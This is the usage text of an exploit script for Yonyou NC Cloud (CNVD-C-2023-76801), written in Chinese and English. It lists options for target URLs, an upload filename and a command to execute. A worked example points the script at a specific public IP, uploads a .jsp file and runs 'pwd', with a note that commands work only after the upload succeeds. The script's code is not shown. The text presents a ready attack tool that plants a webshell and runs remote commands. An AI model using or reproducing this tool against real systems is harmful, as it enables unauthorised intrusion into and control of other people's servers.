用友-NC-cloud exp(CNVD-C-2023-76801) by 我只是好色  
options:  

  命令|一一一|描述
  -----|-----|-----
  -h, |--help         |show this help message and exit  
  -u  |TARGETURL      |Set target url  
  -r  |TARGETURLLIST  |Set url list file  
  -fn |FILENAME       |Set upload filename  
  -c  |COMMAND        |Set execute command  
    
  -Eg:  
  -c 执行命令 
  CNVD-C-2023-76801.py -u http://159.138.102.65:9099  -fn 456789.jsp -c pwd  
  上传成功后才能执行命令且需要指定上传的文件名
